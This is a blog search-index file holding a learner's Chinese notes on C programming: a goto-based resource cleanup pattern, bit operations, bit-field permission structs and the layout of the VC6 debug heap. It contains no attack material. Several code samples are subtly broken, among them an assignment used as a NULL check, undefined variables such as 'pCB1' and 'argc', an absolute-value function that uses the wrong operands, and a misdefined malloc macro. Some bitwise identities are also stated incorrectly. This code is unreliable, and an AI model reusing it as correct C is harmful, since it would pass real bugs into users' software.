<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C22笔记</title>
      <link href="posts/8930.html"/>
      <url>posts/8930.html</url>
      
        <content type="html"><![CDATA[<h3 id="多资源引用规范"><a href="#多资源引用规范" class="headerlink" title="多资源引用规范"></a>多资源引用规范</h3><ol><li>引用资源的变量在作用域开始定义，并初始化为错误值</li><li>申请资源后，必须检查资源是否有效，无效则处理错误</li><li>处理完错误后，转移到统一推出位置（EXIT_PROC）<br>//资源有效正处理</li><li>资源有效正常使用</li><li>释放资源前，必须检查资源是否有效，无效则不处理</li><li>释放资源，必须将引用资源重置为错误值</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;crtdbg.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span>  <span class="token expression">_DEBUG</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">malloc</span><span class="token expression"><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token function">_malloc_dbg</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>_NORMAL_BLOCK_<span class="token punctuation">,</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">//安全释放指针</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">SAFE_FREE</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token keyword">void</span> <span class="token function">ErrorProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">//1. 引用资源的变量在作用域开始定义，并初始化为错误值</span>  <span class="token keyword">int</span> <span class="token operator">*</span>pA <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> pB1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">float</span> <span class="token operator">*</span>pB2 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">double</span> <span class="token operator">*</span>pC <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">//2. 申请资源后，必须检查资源是否有效，无效则处理错误</span> pA <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pA <span class="token operator">==</span>  <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token function">ErrorProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 3. 处理完错误后，转移到统一推出位置（EXIT_PROC）</span>  <span class="token keyword">goto</span> EXIT_PROC<span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token comment">//4. 资源有效则正常使用</span>  <span class="token operator">*</span>pA <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    pB1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pB1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">ErrorProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> EXit_PROC<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>pB1<span class="token punctuation">,</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    pB2 <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">float</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pB2 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">ErrorProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> EXit_PROC<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>pB2 <span class="token operator">=</span> <span class="token number">3.14f</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  pC <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>pC <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">ErrorProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> EXit_PROC<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span>pC <span class="token operator">=</span> <span class="token number">0.618</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EXIT_PROC<span class="token operator">:</span>  <span class="token function">SAFE_FREE</span><span class="token punctuation">(</span>pC<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">SAFE_FREE</span><span class="token punctuation">(</span>pB2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">SAFE_FREE</span><span class="token punctuation">(</span>pCB1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//5. 释放资源前，必循检查资源是否有效，无效则不处理</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>pA  <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//6. 释放资源，必须将引用资源重置为错误值</span>    <span class="token function">free</span><span class="token punctuation">(</span>pA<span class="token punctuation">)</span><span class="token punctuation">;</span>    pA <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">A <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">=</span> AA <span class="token operator">|</span> <span class="token number">0</span>  <span class="token operator">=</span> AA <span class="token operator">&amp;</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">0</span>A <span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">=</span>  <span class="token number">1</span>A <span class="token operator">^</span> A <span class="token operator">=</span> <span class="token number">0</span>A <span class="token operator">^</span> <span class="token number">0</span> <span class="token operator">=</span> AA <span class="token operator">^</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token operator">~</span>AA <span class="token operator">&amp;</span> <span class="token operator">~</span>A <span class="token operator">=</span> <span class="token number">0</span>A <span class="token operator">|</span> <span class="token operator">~</span>A <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">~</span><span class="token punctuation">(</span>A  <span class="token operator">&amp;</span>  <span class="token operator">~</span>A<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>推导：A <span class="token operator">^</span> B <span class="token operator">=</span> CC <span class="token operator">^</span> A <span class="token operator">=</span> BC <span class="token operator">^</span> B <span class="token operator">=</span> A <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="位结构体"><a href="#位结构体" class="headerlink" title="位结构体"></a>位结构体</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">myabs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// unsigned int i =  7; //0111</span>  <span class="token comment">//</span>  <span class="token comment">// i = i &gt;&gt; 1; // 0011 3</span>  <span class="token comment">//</span>  <span class="token comment">// i = -1;</span>  <span class="token comment">// i = i &gt;&gt; 1; //0xfffffffff &gt;&gt; 1 = 0x7fffffff</span>  <span class="token comment">//                               1111 &gt;&gt; 1  0111</span>  <span class="token comment">//                                f          7 </span>  <span class="token comment">//</span>  <span class="token comment">// int j = 7; // 0111</span>  <span class="token comment">// j = j &gt;&gt; 1; // 3</span>  <span class="token comment">// j = -1;</span>  <span class="token comment">// j = j &gt;&gt; 5; //0xffffffff &gt;&gt; 5 = 0xffffffff</span>  <span class="token comment">//-1 不存在值变化的问题</span>  <span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">&gt;&gt;</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token comment">// if  n &gt;= 0 i = 0; else i = 0xffffffff = -1</span>  n <span class="token operator">=</span> n <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">;</span>       <span class="token comment">// if i = 0,n = n; else i = 0xffffffff, n = ~n</span>  <span class="token keyword">return</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">// if i = 0, n - i = n;  else i = -1,n - i = n +  1</span><span class="token punctuation">}</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">myabs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>无符号数移位高位补零</li><li>有符号数移位，正数高位补0，负数高位补1</li><li>-1 移位还是-1 0xffffffff &gt;&gt; ? 0xffffffff</li></ul><h4 id="位权限"><a href="#位权限" class="headerlink" title="位权限"></a>位权限</h4><p>| 或 增加权限<br>&amp; 与 检查权限</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ADD</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEL</span> <span class="token expression"><span class="token number">2</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EDT</span> <span class="token expression"><span class="token number">4</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">QUE</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">int</span> nPrivilege  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">//增加添加权限</span>    nPrivilege <span class="token operator">=</span> nPrivilege <span class="token operator">|</span> ADD<span class="token punctuation">;</span>     <span class="token comment">/* 增加编辑权限，此处nPrivilege有添加和编辑权限 */</span>    nPrivilege <span class="token operator">=</span> nPrivilege <span class="token operator">|</span> EDT<span class="token punctuation">;</span>    <span class="token comment">//检查nPrivilege是否有添加权限</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nPrivilege <span class="token operator">&amp;</span> ADD<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//检查nPrivilege是否有删除权限</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>nPrivilege <span class="token operator">&amp;</span> DEL<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"DEL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//检查nPrivilege是否有编辑权限</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nPrivilege <span class="token operator">&amp;</span> EDT<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"EDT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="结构体控制权限"><a href="#结构体控制权限" class="headerlink" title="结构体控制权限"></a>结构体控制权限</h4><p>描述位，注释注意事项</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// s eeeeeeee dddddddddddddddddddddd  </span><span class="token comment">// s : 符号位</span><span class="token comment">// e : 指数位</span><span class="token comment">// d : 数据位 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>dllmain</code>中有保留字段 <code>reserved</code><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210721235227.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagPrivilege</span><span class="token punctuation">{</span>  <span class="token comment">// xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx qeda</span>  <span class="token comment">// 31.................................3210</span>  <span class="token comment">// a : add</span>  <span class="token comment">// d : del</span>  <span class="token comment">// e : edt</span>  <span class="token comment">// q : que</span>  <span class="token comment">// x : no define </span>  <span class="token comment">// r : reserved  保留字段</span>  <span class="token comment">// n : no use    未使用字段</span>  <span class="token comment">//依次定义了4个位，从低到高</span>  <span class="token keyword">int</span> add<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> del<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> edt<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> que<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">struct</span> <span class="token class-name">tagPrivilege</span> pri <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  pri<span class="token punctuation">.</span>add <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  pri<span class="token punctuation">.</span>del <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//检查是否有添加权限</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>pri<span class="token punctuation">.</span>add<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">//检查是否有删除权限</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>pri<span class="token punctuation">.</span>del<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210721235730.png"><br>已经封装好了，还是同 <code>| 或 增加权限</code>和<code>&amp; 与 检查权限</code></p><ul><li>struct tagPrivilege 中定义的 int add:1;<br>有符号位，高位填符号位<br>符号位是最高有效位，int add:1; （1）而这里只有一位，1代表负数，位运算是高位补符号位，所以最后结构是最高位是1，即值为-1</li></ul><p><strong>int n = pri.add;  n = -1;</strong></p><ul><li>struct tagPrivilege 中定义的 unsigned int add:1;<br>无符号位，高位填0</li></ul><p> <strong>int n = pri.add;  n = 1;</strong></p><p> ⚠⚠⚠ 拿某些位参与运算时，注意定义，有符号还是无符号！！！</p><p>** 举一反三：**<br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210722001210.png"><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210722001814.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210722002111.png"></h2><hr><h2 id="int-0重新对齐"><a href="#int-0重新对齐" class="headerlink" title="int : 0重新对齐"></a><strong><code>int : 0</code>重新对齐</strong></h2><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210722002520.png"></p><h4 id="求下列结构体的sizeof"><a href="#求下列结构体的sizeof" class="headerlink" title="求下列结构体的sizeof"></a>求下列结构体的sizeof</h4><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210722002938.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向入门学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存观察</title>
      <link href="posts/6700.html"/>
      <url>posts/6700.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 分类-这里记得改 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章标签-这里记得改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C20-C21课堂笔记</title>
      <link href="posts/57978.html"/>
      <url>posts/57978.html</url>
      
        <content type="html"><![CDATA[<h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210720183042.png"></p><ul><li>可逆运算 、不可逆运算</li><li>标准加密算法 AES </li><li>检验 MD5</li></ul><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p><code>Windows xp sp2</code>以前堆空间可以被预测,在攻击上能预测内存结构是一件很恐怖的事情<br><code>Windows 7</code>以后堆空间基址随机，据说分配方案达数十种。</p><ul><li>heap_init(0) //初始化堆<ul><li>HeapCreate;</li><li>HeapAlloc;</li><li>HeapFree;</li><li>HeapDestory</li></ul></li></ul><p>malloc(size_t);<br>realloc(void *, size_t);</p><h4 id="堆的细节"><a href="#堆的细节" class="headerlink" title="堆的细节"></a>堆的细节</h4><p><strong>VC6.0调试版堆</strong><br>启用<code>void *_malloc_dbg( size_t size, int blockType, const char *filename, int linenumber );</code><br>他所在的头文件<code>#include &lt;crtdbg.h&gt;</code><br><code>_malloc_dbg</code>的参数信息</p><ul><li><p>size<br>Requested size of memory block (bytes)<br>申请堆的大小</p></li><li><p>blockType<br>Requested type of memory block: _CLIENT_BLOCK or _NORMAL_BLOCK<br>申请堆的类型</p></li><li><p>filename<br>Pointer to name of source file that requested allocation operation or NULL<br>调用堆的文件所在位置</p></li><li><p>linenumber<br>Line number in source file where allocation operation was requested or NULL<br>调用堆的代码所在行号</p></li></ul><h4 id="demo代码"><a href="#demo代码" class="headerlink" title="demo代码"></a>demo代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;crtdbg.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_DEBUG</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">malloc</span><span class="token expression"><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token function">_malloc_dbg</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> _CLIENT_BLOCK<span class="token punctuation">,</span> <span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">/*        void *_malloc_dbg( size_t size, int blockType, const char *filename, int linenumber );*/</span>    <span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> <span class="token operator">*</span>psz <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>psz<span class="token punctuation">,</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>psz2 <span class="token operator">=</span>   <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>psz <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>    p <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>psz2<span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6666</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8888</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//free(psz2);</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210720213720.png"></p><hr><ol><li>堆内存解析<ol><li>前一个堆的位置（地址）</li><li>后一个堆的位置（地址）</li><li>调试符号（申请堆文件的所在位置）</li><li>调试符号（申请堆代码所在行号）</li><li>堆的体积（用户能用的体积，不含附加信息数据段）</li><li>堆类型（运行时、C库等等）</li><li>堆编号</li><li>上溢标志</li><li>堆空间</li><li>下溢标志<br>1-8和10 属于堆的附加数据信息，9是正儿八经的堆空间</li></ol></li></ol><hr><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210720213938.png"><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210720221639.png"><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210720222336.png"> </p><p>上述图片堆内存内容解析解析</p><ul><li>int* 指针p的地址是<code>0x00730e48</code>(由malloc函数申请、所处是_malloc_dbg(),这个函数附带了更多的调试信息),int *p的 大小是4字节(<code>int *p = (int *)malloc(4);</code>)。</li><li>从<code>0x00730e48</code>处前数0x20字节（32字节）是申请堆空间的起始地址，即<code>0x00730e28</code>,<code>0x00730e28</code>地址所存内容<code>0x007305e0</code>是上一块堆的地址.</li><li>地址<code>0x00730e2c</code>的内容是下一块堆的地址（<code>0x 000 0000</code>）,这是全零，说明没有后一块堆了，它就是最后一块堆。</li><li>地址<code>0x00730e30</code>处的内容是<code>0x 0043 2f74</code>，这里表明申请堆的文件它所在的<code>**路径**</code></li><li>地址<code>0x00730e34</code>这里表明申请堆的代码所在<code>**行号**</code></li><li>地址<code>0x00730e38</code>的内容是<code>0x 0000 0004</code>,表明堆的大小是<code>4字节</code></li><li>地址<code>0x00730e3c</code>的内容是<code>0x 0000 0004</code>，表明堆的类型是4号，即<code>（_CLIENT_BLOCK    4）</code></li><li>地址<code>0x00730e40</code>的内容是<code>0x 0000 0039</code>,表明堆的编号是<code>0x 0000 0039</code></li><li>地址<code>0x00730e44</code>的内容是<code>0x FDFD FDFD</code>,这是堆的上溢标志，即完整，没有溢出</li><li>地址<code>0x00730e48</code>的内容是<code>0x 0000 03E7</code>，<code>0x0x00730e48 - 0x00730e4b</code>是堆的数据空间，大小<code>四字节</code> (<code>int *p = (int *)malloc(4);</code>)，内容是 <code>0xe37</code>为10进制的<code>999</code></li><li>地址<code>0x00730e4C</code>,这是堆的下溢标志，内容为<code>0x FDFD FDFD</code>，即完整，没有溢出</li></ul><hr><ul><li><p><strong>调试技巧</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro 